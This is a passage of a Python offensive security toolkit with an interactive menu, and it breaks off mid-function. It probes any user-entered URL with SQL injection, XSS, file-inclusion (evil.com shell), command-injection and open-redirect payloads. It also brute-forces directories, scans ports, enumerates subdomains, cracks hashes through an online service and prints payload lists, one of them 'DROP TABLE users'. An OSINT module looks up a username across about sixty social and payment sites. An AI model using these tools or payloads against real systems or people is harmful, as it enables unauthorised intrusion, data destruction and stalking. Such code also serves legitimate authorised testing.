        except:
            return None

    def _check_sqli(self, url: str) -> None:
        """Test for SQL injection vulnerabilities."""
        self.report.info("Testing SQL Injection...")

        base, params = self._extract_params(url)
        sqli_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
            "' OR '1'='1' --", "' OR 1=1/*", "1' OR '1'='1",
            "1' OR 1=1--", "1' OR 1=1#", '" OR "1"="1',
            "admin'--", "admin' #", "' UNION SELECT 1--",
            "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
            "') OR ('1'='1", "1 AND 1=1", "1 AND 1=2",
        ]

        found = False
        for param in params:
            for payload in sqli_payloads[:5]:  # Limit to first 5 per param for speed
                response = self._test_endpoint(url, param, payload)
                if response:
                    body = response.text.lower()
                    if any(err in body for err in self.SQL_ERRORS):
                        test_url = f"{base}?{param}={quote(payload[:20])}..."
                        self.report.add_finding("SQL Injection", test_url, "CRITICAL",
                                              f"SQL error detected with payload: {payload[:30]}")
                        self.report.found(f"SQL Injection! Parameter: {param}")
                        found = True
                        break

            if found:
                break

        if not found:
            self.report.info("No SQL injection detected")

    def _check_xss(self, url: str) -> None:
        """Test for cross-site scripting vulnerabilities."""
        self.report.info("Testing XSS...")

        base, params = self._extract_params(url)
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
        ]

        found = False
        for param in params:
            for payload in xss_payloads[:3]:
                response = self._test_endpoint(url, param, payload)
                if response and payload.strip('"').strip("'")[:20] in response.text:
                    test_url = f"{base}?{param}={quote(payload[:20])}..."
                    self.report.add_finding("Reflected XSS", test_url, "HIGH",
                                          f"Payload reflected: {payload[:30]}")
                    self.report.found(f"Reflected XSS! Parameter: {param}")
                    found = True
                    break

            if found:
                break

        if not found:
            self.report.info("No XSS detected")

    def _check_lfi(self, url: str) -> None:
        """Test for local file inclusion."""
        self.report.info("Testing LFI...")

        base, params = self._extract_params(url)
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../../etc/passwd",
        ]

        found = False
        for param in params:
            for payload in lfi_payloads:
                response = self._test_endpoint(url, param, payload)
                if response:
                    if any(sig in response.text for sig in self.LFI_SIGNATURES):
                        test_url = f"{base}?{param}={quote(payload[:20])}..."
                        self.report.add_finding("Local File Inclusion", test_url, "CRITICAL",
                                              f"File content detected with payload: {payload[:30]}")
                        self.report.found(f"LFI! Parameter: {param}")
                        found = True
                        break

                    # Check for base64 encoded PHP filter output
                    if "php://filter" in payload and len(response.text) > 100:
                        try:
                            import re
                            b64_match = re.search(r'[A-Za-z0-9+/=]{50,}', response.text)
                            if b64_match:
                                decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                                if '<?php' in decoded or 'root:' in decoded:
                                    test_url = f"{base}?{param}={quote(payload[:20])}..."
                                    self.report.add_finding("LFI via PHP Filter", test_url, "CRITICAL",
                                                          f"Base64 decoded content from: {payload[:30]}")
                                    self.report.found(f"LFI (PHP Filter)! Parameter: {param}")
                                    found = True
                                    break
                        except:
                            pass

            if found:
                break

        if not found:
            self.report.info("No LFI detected")

    def _check_rfi(self, url: str) -> None:
        """Test for remote file inclusion (basic check)."""
        self.report.info("Testing RFI...")

        base, params = self._extract_params(url)
        test_urls = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt?",
            "http://localhost:8080/test",
        ]

        found = False
        for param in params[:3]:
            for test_url_rfi in test_urls[:1]:
                response = self._test_endpoint(url, param, test_url_rfi)
                if response and "failed to open stream" in response.text.lower():
                    self.report.add_finding("Remote File Inclusion (PHP RFI)", f"{base}?{param}=...", "CRITICAL",
                                          "Server attempts to include remote file")
                    self.report.found(f"Potential RFI! Parameter: {param}")
                    found = True
                    break

            if found:
                break

        if not found:
            self.report.info("No RFI detected")

    def _check_cmdi(self, url: str) -> None:
        """Test for command injection."""
        self.report.info("Testing Command Injection...")

        base, params = self._extract_params(url)
        cmdi_payloads = [
            ";ping -c 1 127.0.0.1",
            "|ping -n 1 127.0.0.1",
            "&& ping -c 1 127.0.0.1",
            "`ping -c 1 127.0.0.1`",
            "$(ping -c 1 127.0.0.1)",
        ]

        # Timing-based detection
        import time as time_module

        found = False
        for param in params[:3]:
            for payload in cmdi_payloads:
                response = self._test_endpoint(url, param, payload)
                if response:
                    # Check for command output in response
                    if "ping" in response.text.lower() and ("ttl=" in response.text.lower() or "bytes from" in response.text.lower()):
                        self.report.add_finding("Command Injection", f"{base}?{param}=...", "CRITICAL",
                                              f"Command output visible: ping result detected")
                        self.report.found(f"Command Injection! Parameter: {param}")
                        found = True
                        break

            if found:
                break

        if not found:
            self.report.info("No command injection detected")

    def _check_open_redirect(self, url: str) -> None:
        """Test for open redirect vulnerabilities."""
        self.report.info("Testing Open Redirect...")

        base, params = self._extract_params(url)
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "http://evil.com@google.com",
            "https://evil.com?",
        ]

        for param in params[:3]:
            for payload in redirect_payloads:
                response = self._test_endpoint(url, param, payload)
                if response and response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location:
                        self.report.add_finding("Open Redirect", f"{base}?{param}=...", "MEDIUM",
                                              f"Redirects to: {location}")
                        self.report.found(f"Open Redirect! Parameter: {param}")
                        return

        self.report.info("No open redirect detected")

    def _check_headers(self, url: str) -> None:
        """Security headers analysis."""
        self.report.info("Analyzing security headers...")

        try:
            r = self.session.get(url, timeout=10)
            headers = r.headers

            header_checks = {
                "Content-Security-Policy": ("HIGH", "XSS and data injection protection"),
                "Strict-Transport-Security": ("HIGH", "Man-in-the-middle protection"),
                "X-Frame-Options": ("MEDIUM", "Clickjacking protection"),
                "X-Content-Type-Options": ("LOW", "MIME-type sniffing protection"),
                "Referrer-Policy": ("LOW", "Referrer leakage protection"),
                "Permissions-Policy": ("LOW", "Feature restriction"),
            }

            for header, (severity, purpose) in header_checks.items():
                if header not in headers:
                    self.report.add_finding("Missing Security Header", url, severity,
                                          f"{header} — {purpose}")

        except Exception as e:
            self.report.warning(f"Header analysis error: {e}")

    def _check_cors(self, url: str) -> None:
        """Test for CORS misconfiguration."""
        self.report.info("Testing CORS...")

        try:
            origin = "https://evil.com"
            r = self.session.get(url, headers={"Origin": origin}, timeout=10)

            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*" or acao == origin:
                sev = "CRITICAL" if acac == "true" else "HIGH"
                self.report.add_finding("CORS Misconfiguration", url, sev,
                                      f"ACAO: {acao}, Credentials: {acac}")
                self.report.found(f"CORS allows external origin: {acao}")
            else:
                self.report.info("CORS properly configured")

        except Exception as e:
            self.report.warning(f"CORS test error: {e}")

    def _check_info_disclosure(self, url: str) -> None:
        """Check for information disclosure."""
        self.report.info("Checking information disclosure...")

        sensitive_paths = [
            "server-status", "server-info", "phpinfo.php", "info.php",
            ".git/config", ".env", "wp-config.php.bak",
            "robots.txt", "crossdomain.xml"
        ]

        for path in sensitive_paths:
            test_url = f"{url}/{path}"
            try:
                r = self.session.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.text) > 10:
                    if "Server Information" in r.text or "PHP Version" in r.text:
                        self.report.add_finding("Information Disclosure", test_url, "MEDIUM",
                                              f"Sensitive information exposed at {path}")
                        self.report.found(f"Info disclosure: {test_url}")
            except:
                pass

    def _check_http_methods(self, url: str) -> None:
        """Test for dangerous HTTP methods."""
        self.report.info("Testing HTTP methods...")

        dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]

        for method in dangerous_methods:
            try:
                r = self.session.request(method, url, timeout=5)
                if r.status_code not in [403, 405, 501]:
                    self.report.add_finding("Dangerous HTTP Method", url, "MEDIUM",
                                          f"Method {method} returned {r.status_code}")
                    self.report.found(f"Enabled HTTP method: {method} ({r.status_code})")
            except:
                pass


# ============================================================================
# MODULE 4: USER FINDER (OSINT)
# ============================================================================

class UserFinder:
    """Advanced OSINT username search across 50+ platforms."""

    SITES = {
        # Social Media
        "Instagram": "https://instagram.com/{username}",
        "Twitter/X": "https://twitter.com/{username}",
        "Facebook": "https://facebook.com/{username}",
        "TikTok": "https://tiktok.com/@{username}",
        "Snapchat": "https://snapchat.com/add/{username}",
        "LinkedIn": "https://linkedin.com/in/{username}",
        "YouTube": "https://youtube.com/@{username}",
        "Reddit": "https://reddit.com/user/{username}",
        "Pinterest": "https://pinterest.com/{username}",
        "Tumblr": "https://{username}.tumblr.com",
        "Telegram": "https://t.me/{username}",
        "Discord": "https://discord.com/users/{username}",

        # Tech & Dev
        "GitHub": "https://github.com/{username}",
        "GitLab": "https://gitlab.com/{username}",
        "Bitbucket": "https://bitbucket.org/{username}",
        "StackOverflow": "https://stackoverflow.com/users/{username}",
        "Medium": "https://medium.com/@{username}",
        "Dev.to": "https://dev.to/{username}",
        "CodePen": "https://codepen.io/{username}",
        "Replit": "https://replit.com/@{username}",
        "HackerNews": "https://news.ycombinator.com/user?id={username}",
        "Kaggle": "https://kaggle.com/{username}",

        # Gaming & Streaming
        "Twitch": "https://twitch.tv/{username}",
        "Steam": "https://steamcommunity.com/id/{username}",
        "Epic Games": "https://epicgames.com/id/{username}",
        "Xbox": "https://xbox.com/en-US/player/{username}",
        "PlayStation": "https://playstation.com/en-us/playstation-network/profile/{username}",

        # Creative
        "Behance": "https://behance.net/{username}",
        "Dribbble": "https://dribbble.com/{username}",
        "Flickr": "https://flickr.com/people/{username}",
        "500px": "https://500px.com/{username}",
        "SoundCloud": "https://soundcloud.com/{username}",
        "Spotify": "https://open.spotify.com/user/{username}",
        "Vimeo": "https://vimeo.com/{username}",

        # Forums & Communities
        "AngelList": "https://angel.co/u/{username}",
        "ProductHunt": "https://producthunt.com/@{username}",
        "About.me": "https://about.me/{username}",
        "Keybase": "https://keybase.io/{username}",
        "Disqus": "https://disqus.com/by/{username}",

        # Messaging
        "WhatsApp": "https://wa.me/{username}",
        "Signal": "https://signal.me/#p/{username}",
        "Skype": "https://join.skype.com/u/{username}",

        # Other
        "Linktree": "https://linktr.ee/{username}",
        "BuyMeACoffee": "https://buymeacoffee.com/{username}",
        "Patreon": "https://patreon.com/{username}",
        "CashApp": "https://cash.app/${username}",
        "Venmo": "https://venmo.com/{username}",
        "PayPal": "https://paypal.com/paypalme/{username}",
        "WordPress": "https://{username}.wordpress.com",
        "Wix": "https://{username}.wixsite.com",

        # Professional
        "Fiverr": "https://fiverr.com/{username}",
        "Upwork": "https://upwork.com/freelancers/{username}",
        "Freelancer": "https://freelancer.com/u/{username}",

        # Crypto & Web3
        "Etherscan": "https://etherscan.io/address/{username}",
        "OpenSea": "https://opensea.io/{username}",
        "Rarible": "https://rarible.com/user/{username}",
    }

    def __init__(self, report: Report):
        self.report = report
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

    def run(self) -> None:
        """Run user search."""
        username = input(f"\n{Color.p_question('Enter username to search: ')}")

        if not username.strip():
            self.report.error("No username provided")
            return

        self.report.info(f"User Finder — Searching for: {Color.NEON_YELLOW}{username}{Color.NC}")
        self.report.info(f"Scanning {len(self.SITES)} platforms...\n")

        results = []
        total = len(self.SITES)
        completed = 0

        def check_site(site_name: str, url_template: str) -> Optional[Dict]:
            nonlocal completed
            url = url_template.replace("{username}", username)

            # Check if it looks like a username or ID
            if site_name in ["Etherscan"] and not username.startswith("0x"):
                completed += 1
                return None

            try:
                r = self.session.get(url, timeout=8, allow_redirects=True)
                completed += 1

                # Show progress
                progress = f"\r  {Color.DIM}Progress: [{completed}/{total}] {site_name:25s}{Color.NC}"
                print(f"{progress}", end="", flush=True)

                # Better detection
                if r.status_code == 200:
                    # Check for common "not found" patterns
                    body = r.text.lower()
                    not_found_patterns = [
                        "not found", "page not found", "doesn't exist", "does not exist",
                        "user not found", "no user found", "couldn't find",
                        "this page doesn't exist", "this profile doesn't exist",
                        "sorry, this page isn't available", "page unavailable",
                        "no results found", "no one uses this name"
                    ]

                    if any(p in body for p in not_found_patterns):
                        return None

                    return {
                        "site": site_name,
                        "url": url,
                        "status": r.status_code,
                        "size": len(r.content)
                    }

            except:
                completed += 1
                print(f"\r  {Color.DIM}Progress: [{completed}/{total}] {site_name:25s}{Color.NC}", end="", flush=True)

            return None

        print()

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_site, name, tmpl): name
                      for name, tmpl in self.SITES.items()}

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except:
                    pass

        print(f"\n\n{Color.NEON_PURPLE}{'─' * 60}{Color.NC}\n")

        if results:
            self.report.success(f"Found {len(results)}/{len(self.SITES)} profiles for: {username}\n")

            # Sort by platform category
            social = [r for r in results if r['site'] in ["Instagram", "Twitter/X", "Facebook", "TikTok", "Snapchat", "Reddit", "LinkedIn"]]
            tech = [r for r in results if r['site'] in ["GitHub", "GitLab", "Bitbucket", "StackOverflow", "Medium", "Dev.to", "CodePen", "Replit"]]
            creative = [r for r in results if r['site'] in ["YouTube", "Twitch", "SoundCloud", "Spotify", "Behance", "Dribbble", "Flickr"]]
            other = [r for r in results if r not in social + tech + creative]

            categories = [
                ("📱 Social Media", social),
                ("💻 Tech/Dev", tech),
                ("🎨 Creative/Gaming", creative),
                ("🌐 Other", other)
            ]

            for cat_name, cat_results in categories:
                if cat_results:
                    print(f"  {Color.NEON_CYAN}{cat_name}:{Color.NC}")
                    for r in cat_results:
                        print(f"    {Color.NEON_GREEN}►{Color.NC} {Color.BOLD}{r['site']:<15}{Color.NC} {Color.DIM}{r['url']}{Color.NC}")
                    print()

            # Generate report entries
            for r in results:
                self.report.add_finding("OSINT Profile Found", r['url'], "INFO",
                                      f"{r['site']} profile for {username}")
        else:
            self.report.warning(f"No profiles found for: {username}")

        self.report.info("User search completed")


# ============================================================================
# MODULE 5: DIRECTORY BRUTEFORCER
# ============================================================================

class DirectoryBruteforcer:
    """High-performance directory bruteforcer."""

    def __init__(self, report: Report):
        self.report = report
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })

    def run(self) -> None:
        """Run directory bruteforce."""
        url = input(f"\n{Color.p_question('Enter target URL: ')}")
        url = ensure_url(url)

        # Wordlist selection
        print(f"\n{Color.NEON_CYAN}Select wordlist:{Color.NC}")
        print(f"  {Color.B}[1]{Color.NC} Small (50 paths — fast)")
        print(f"  {Color.B}[2]{Color.NC} Medium (500 paths)")
        print(f"  {Color.B}[3]{Color.NC} Large (2000 paths — comprehensive)")
        print(f"  {Color.B}[4]{Color.NC} Custom wordlist file")

        choice = input(f"\n{Color.p_question('Select [1-4]: ')}").strip()

        wordlist = []

        if choice == "4":
            filepath = input(f"{Color.p_question('Enter wordlist path: ')}")
            try:
                with open(filepath, 'r') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                self.report.info(f"Loaded {len(wordlist)} words from {filepath}")
            except FileNotFoundError:
                self.report.error(f"File not found: {filepath}")
                return
        else:
            sizes = {"1": 50, "2": 500, "3": 2000}
            count = sizes.get(choice, 50)
            wordlist = get_common_dirs()

            # Extend wordlist for medium/large
            if count >= 500:
                extensions = [".php", ".asp", ".aspx", ".jsp", ".html", ".txt", ".bak", ".old", ".zip", ".tar.gz"]
                for d in wordlist[:50]:
                    for ext in extensions:
                        wordlist.append(f"{d}{ext}")

            if count >= 2000:
                for d in wordlist[:100]:
                    for i in range(1, 10):
                        wordlist.append(f"{d}{i}")
                        wordlist.append(f"{d}-{i}")

            wordlist = list(set(wordlist))[:count]

        self.report.info(f"Directory Bruteforce — Target: {url}")
        self.report.info(f"Wordlist: {len(wordlist)} paths")

        found = []

        def check_dir(path: str) -> Optional[Tuple[str, int, int]]:
            test_url = f"{url}/{path}"
            try:
                r = self.session.get(test_url, timeout=5, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403, 405, 500, 503]:
                    return (path, r.status_code, len(r.content))
            except:
                pass
            return None

        self.report.info("Scanning...\n")

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_dir, w): w for w in wordlist}

            for i, future in enumerate(as_completed(futures), 1):
                if i % 100 == 0:
                    print(f"\r  {Color.DIM}Progress: {i}/{len(wordlist)} paths checked...{Color.NC}", end="", flush=True)

                try:
                    result = future.result()
                    if result:
                        found.append(result)
                        path, status, size = result

                        # Color by status code
                        if status == 200:
                            status_color = Color.G
                            sev = "MEDIUM"
                        elif status in [301, 302]:
                            status_color = Color.Y
                            sev = "LOW"
                        elif status in [401, 403]:
                            status_color = Color.C
                            sev = "LOW"
                        else:
                            status_color = Color.R
                            sev = "LOW"

                        size_str = f"{size:,}b" if size < 1024 else f"{size/1024:.1f}kb"
                        print(f"\r  {Color.NEON_GREEN}[FOUND]{Color.NC} [{status_color}{status}{Color.NC}] {test_url:<60} {Color.DIM}({size_str}){Color.NC}")

                        self.report.add_finding("Directory Found", test_url, sev,
                                              f"HTTP {status}, Size: {size_str}")

                except:
                    pass

        print()

        if not found:
            self.report.warning("No interesting directories found")
        else:
            self.report.success(f"Found {len(found)} accessible paths")

            # Summary by status code
            status_counts = {}
            for path, status, size in found:
                status_counts[status] = status_counts.get(status, 0) + 1

            print(f"\n  {Color.DIM}Summary by status:{Color.NC}")
            for status, count in sorted(status_counts.items()):
                print(f"    HTTP {status}: {count} paths")

        self.report.info("Directory scan completed")


# ============================================================================
# MODULE 6: PORT SCANNER (PYTHON NATIVE)
# ============================================================================

class PortScanner:
    """Native Python port scanner with async I/O."""

    def __init__(self, report: Report):
        self.report = report

    def run(self) -> None:
        """Run port scan."""
        target = input(f"\n{Color.p_question('Enter IP or hostname: ')}")

        # Resolve target
        ip, hostname = resolve_target(target)
        if not ip:
            self.report.error(f"Cannot resolve: {target}")
            return

        self.report.info(f"Port Scanner — Target: {target}")
        self.report.info(f"Resolved IP: {ip}")

        # Scan type selection
        print(f"\n{Color.NEON_CYAN}Select scan type:{Color.NC}")
        print(f"  {Color.B}[1]{Color.NC} Quick scan (common 20 ports)")
        print(f"  {Color.B}[2]{Color.NC} Standard scan (100 ports)")
        print(f"  {Color.B}[3]{Color.NC} Full scan (1-1024)")
        print(f"  {Color.B}[4]{Color.NC} Custom range")

        choice = input(f"\n{Color.p_question('Select [1-4]: ')}").strip()

        ports_to_scan = []
        common_ports = get_common_ports()

        if choice == "1":
            ports_to_scan = list(common_ports.keys())[:20]
        elif choice == "2":
            ports_to_scan = list(common_ports.keys())
        elif choice == "3":
            ports_to_scan = list(range(1, 1025))
        elif choice == "4":
            range_str = input(f"{Color.p_question('Enter range (e.g., 1-1000 or 80,443,8080): ')}")
            if '-' in range_str:
                start, end = range_str.split('-')
                ports_to_scan = list(range(int(start), int(end) + 1))
            elif ',' in range_str:
                ports_to_scan = [int(p.strip()) for p in range_str.split(',')]
            else:
                ports_to_scan = [int(range_str)]
        else:
            ports_to_scan = list(common_ports.keys())

        total_ports = len(ports_to_scan)
        self.report.info(f"Scanning {total_ports} ports on {ip}...\n")

        open_ports = []
        scanned = 0

        def scan_port(port: int) -> Optional[Tuple[int, str]]:
            nonlocal scanned
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                result = sock.connect_ex((ip, port))
                sock.close()

                scanned += 1
                if scanned % 50 == 0:
                    print(f"\r  {Color.DIM}Progress: {scanned}/{total_ports} ports scanned ({scanned*100//total_ports}%){Color.NC}", end="", flush=True)

                if result == 0:
                    service = common_ports.get(port, "unknown")
                    return (port, service)
            except:
                pass
            return None

        # Show initial progress
        print(f"  {Color.DIM}Starting scan...{Color.NC}")

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(scan_port, p): p for p in ports_to_scan}

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        open_ports.append(result)
                except:
                    pass

        print()

        # Display results
        print(f"\n{Color.NEON_PURPLE}{'─' * 60}{Color.NC}")

        if open_ports:
            self.report.found(f"Open ports found: {len(open_ports)}/{total_ports}\n")

            print(f"  {Color.BOLD}{'PORT':<10} {'STATE':<8} {'SERVICE':<20}{Color.NC}")
            print(f"  {Color.DIM}{'─' * 40}{Color.NC}")

            for port, service in sorted(open_ports):
                print(f"  {Color.NEON_GREEN}{str(port) + '/tcp':<10}{Color.NC} {Color.G}open{Color.NC:<8} {service:<20}")

                self.report.add_finding("Open Port", f"{ip}:{port}", "MEDIUM",
                                      f"Port {port}/tcp — {service}")
        else:
            self.report.warning("No open ports found")

        print(f"{Color.NEON_PURPLE}{'─' * 60}{Color.NC}")
        self.report.success(f"Port scan completed — {len(open_ports)} open ports")


# ============================================================================
# MODULE 7: EXTRA TOOLS
# ============================================================================

class DNSScanner:
    """DNS enumeration scanner."""

    def __init__(self, report: Report):
        self.report = report

    def run(self) -> None:
        """Run DNS scan."""
        domain = input(f"\n{Color.p_question('Enter domain: ')}")

        self.report.info(f"DNS Scan — Domain: {domain}")

        record_types = {
            "A": "IPv4 Address",
            "AAAA": "IPv6 Address",
            "MX": "Mail Exchange",
            "NS": "Name Servers",
            "TXT": "Text Records",
            "SOA": "Start of Authority",
            "CNAME": "Canonical Name",
        }

        for rtype, description in record_types.items():
            try:
                result = subprocess.run(
                    ["dig", "+short", rtype, domain],
                    capture_output=True, text=True, timeout=5
                )
                output = result.stdout.strip()
                if output:
                    self.report.found(f"{rtype} ({description}):")
                    for line in output.split('\n')[:3]:
                        print(f"    {Color.DIM}{line}{Color.NC}")
                        self.report.add_finding("DNS Record", f"{domain} {rtype}", "INFO",
                                              f"{description}: {line}")
            except:
                try:
                    import dns.resolver
                    resolver = dns.resolver.Resolver()
                    answers = resolver.resolve(domain, rtype)
                    for answer in answers:
                        self.report.found(f"{rtype} ({description}): {answer}")
                except:
                    pass

        self.report.info("DNS scan completed")


class SubdomainScanner:
    """Subdomain enumeration scanner."""

    def __init__(self, report: Report):
        self.report = report
        self.session = requests.Session()

    def run(self) -> None:
        """Run subdomain scan."""
        domain = input(f"\n{Color.p_question('Enter domain (e.g., example.com): ')}")

        self.report.info(f"Subdomain Scanner — Domain: {domain}")

        subdomains = [
            "www", "mail", "ftp", "admin", "api", "dev", "test",
            "portal", "app", "blog", "shop", "cpanel", "vpn",
            "secure", "webmail", "support", "help", "docs", "status",
            "cdn", "static", "assets", "images", "upload", "backup",
            "db", "database", "mysql", "redis", "proxy", "ns1", "ns2",
            "mx1", "mx2", "smtp", "pop3", "imap", "owa", "exchange",
            "git", "jenkins", "jira", "confluence", "wiki",
            "cloud", "aws", "azure", "gcp", "s3",
            "stage", "staging", "beta", "alpha", "demo",
            "monitor", "monitoring", "grafana", "kibana", "log",
            "chat", "meet", "zoom", "teams", "slack",
            "analytics", "tracking", "metrics",
            "mobile", "m", "wap", "mobi",
            "www2", "www3", "www4",
            "ns1", "ns2", "ns3", "dns1", "dns2",
            "mx", "mx1", "mx2", "mail2",
            "remote", "access", "connect",
            "partner", "partners", "vendor",
            "recruit", "careers", "jobs",
            "news", "press", "media",
            "community", "forum", "board",
        ]

        found = []

        def check_sub(sub: str) -> Optional[str]:
            subdomain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                return subdomain
            except:
                pass
            return None

        self.report.info(f"Checking {len(subdomains)} subdomains via DNS...\n")

        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(check_sub, s): s for s in subdomains}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        found.append(result)
                        self.report.found(f"Subdomain: {result}")
                        self.report.add_finding("Subdomain Found", result, "INFO",
                                              f"Subdomain resolves via DNS")
                except:
                    pass

        if not found:
            self.report.warning("No subdomains found via DNS")
            self.report.info("Tip: Try a larger wordlist or use a DNS brute-force tool")
        else:
            self.report.success(f"Found {len(found)} subdomains")

        self.report.info("Subdomain scan completed")


# ============================================================================
# MODULE 8: HASH TOOLS
# ============================================================================

class HashTools:
    """Hash generation and cracking utilities."""

    def __init__(self, report: Report):
        self.report = report

    def run(self) -> None:
        """Run hash tools menu."""
        print(f"\n{Color.NEON_CYAN}Hash Tools:{Color.NC}")
        print(f"  {Color.B}[1]{Color.NC} Generate hash")
        print(f"  {Color.B}[2]{Color.NC} Crack MD5 hash (via online API)")
        print(f"  {Color.B}[3]{Color.NC} Crack SHA1 hash (via online API)")
        print(f"  {Color.B}[4]{Color.NC} Identify hash type")

        choice = input(f"\n{Color.p_question('Select [1-4]: ')}").strip()

        if choice == "1":
            text = input(f"{Color.p_question('Enter string to hash: ')}")
            print(f"\n  {Color.NEON_CYAN}Results:{Color.NC}")
            print(f"    MD5:       {Color.G}{hashlib.md5(text.encode()).hexdigest()}{Color.NC}")
            print(f"    SHA1:      {Color.G}{hashlib.sha1(text.encode()).hexdigest()}{Color.NC}")
            print(f"    SHA256:    {Color.G}{hashlib.sha256(text.encode()).hexdigest()}{Color.NC}")
            print(f"    SHA512:    {Color.G}{hashlib.sha512(text.encode()).hexdigest()}{Color.NC}")
            self.report.success("Hash generated")

        elif choice in ["2", "3"]:
            algo = "md5" if choice == "2" else "sha1"
            hash_value = input(f"{Color.p_question(f'Enter {algo.upper()} hash: ')}")

            self.report.info(f"Attempting to crack {algo.upper()} hash...")

            try:
                r = requests.get(
                    f"https://www.nitrxgen.io/api/v1/check?value={hash_value}",
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=10
                )
                if r.status_code == 200 and r.text.strip():
                    self.report.found(f"Cracked: {r.text.strip()}")
                else:
                    self.report.warning("Could not crack hash (try a larger database)")
            except:
                self.report.error("API lookup failed")

        elif choice == "4":
            hash_value = input(f"{Color.p_question('Enter hash to identify: ')}")
            length = len(hash_value)

            print(f"\n  {Color.NEON_CYAN}Hash analysis:{Color.NC}")
            print(f"    Length: {length} characters")

            identifications = {
                32: "MD5, MD4, MD2, RIPEMD-128",
                40: "SHA-1, RIPEMD-160, HAVAL-160",
                56: "SHA-224, SHA3-224",
                64: "SHA-256, SHA3-256, BLAKE2-256",
                96: "SHA-384, SHA3-384",
                128: "SHA-512, SHA3-512, BLAKE2-512",
            }

            if length in identifications:
                self.report.info(f"Possible types: {identifications[length]}")
            else:
                self.report.warning(f"Unknown hash length: {length}")


# ============================================================================
# MODULE 9: PAYLOAD GENERATOR
# ============================================================================

class PayloadGenerator:
    """Generate payloads for security testing."""

    def __init__(self, report: Report):
        self.report = report

    def run(self) -> None:
        """Run payload generator."""
        print(f"\n{Color.NEON_CYAN}Payload Generator:{Color.NC}")
        print(f"  {Color.B}[1]{Color.NC} Generate SQL Injection payloads")
        print(f"  {Color.B}[2]{Color.NC} Generate XSS payloads")
        print(f"  {Color.B}[3]{Color.NC} Generate LFI payloads")
        print(f"  {Color.B}[4]{Color.NC} Generate custom reverse shell (Python/Java/PHP/Netcat)")

        choice = input(f"\n{Color.p_question('Select [1-4]: ')}").strip()

        if choice == "1":
            self._sqli_payloads()
        elif choice == "2":
            self._xss_payloads()
        elif choice == "3":
            self._lfi_payloads()
        elif choice == "4":
            self._reverse_shell()

    def _sqli_payloads(self) -> None:
        """Generate SQL injection payloads."""
        print(f"\n{Color.NEON_CYAN}SQL Injection Payloads:{Color.NC}\n")

        payloads = [
            ("Basic Auth Bypass", "' OR '1'='1' -- "),
            ("Auth Bypass #2", "' OR 1=1--"),
            ("Union Based", "' UNION SELECT 1,2,3--"),
            ("Union Columns", "' UNION SELECT 1,2,3,4,5--"),
            ("Error Based", "' AND 1=CONVERT(int, @@version)--"),
            ("Time Based", "' WAITFOR DELAY '0:0:5'--"),
            ("Blind Check", "' AND 1=1--"),
            ("Blind False", "' AND 1=2--"),
            ("Comment SQL", "admin'--"),
            ("MySQL Comment", "1'/*"),
            ("Stacked Query", "'; DROP TABLE users--"),
            ("Order By", "' ORDER BY 1--"),
        ]

        for i, (name, payload) in enumerate(payloads, 1):
            print(f"  {Color.NEON_GREEN}[{i}]{Color.NC} {Color.BOLD}{name:<20}{Color.NC} {Color.DIM}{payload}{Color.NC}")

        self.report.info(f"Generated {len(payloads)} SQLi payloads")

    def _xss_payloads(self) -> None:
        """Generate XSS payloads."""
        print(f"\n{Color.NEON_CYAN}XSS Payloads:{Color.NC}\n")

        payloads = [
            ("Basic Script", "<script>alert(1)</script>"),
            ("Image OnError", "<img src=x onerror=alert(1)>"),
            ("SVG Onload", "<svg onload=alert(1)>"),
            ("Body Onload", "<body onload=alert(1)>"),
            ("Input Focus", "<input onfocus=alert(1) autofocus>"),
            ("Details Tag", "<details open ontoggle=alert(1)>"),
            ("IFrame", "<iframe onload=alert(1)>"),
            ("Link Href", "<a href=javascript:alert(1)>click"),
            ("Unicode Bypass", "<img src=x onerror=\u0061lert(1)>"),
            ("Double Quote", "\"><script>alert(1)</script>"),
            ("Single Quote", "'><script>alert(1)</script>"),
            ("Polyglot", "\"'><img src=x onerror=alert(1)>"),
        ]

        for i, (name, payload) in enumerate(payloads, 1):
            print(f"  {Color.NEON_GREEN}[{i}]{Color.NC} {Color.BOLD}{name:<20}{Color.NC} {Color.DIM}{payload}{Color.NC}")

        self.report.info(f"Generated {len(payloads)} XSS payloads")

    def _lfi_payloads(self) -> None:
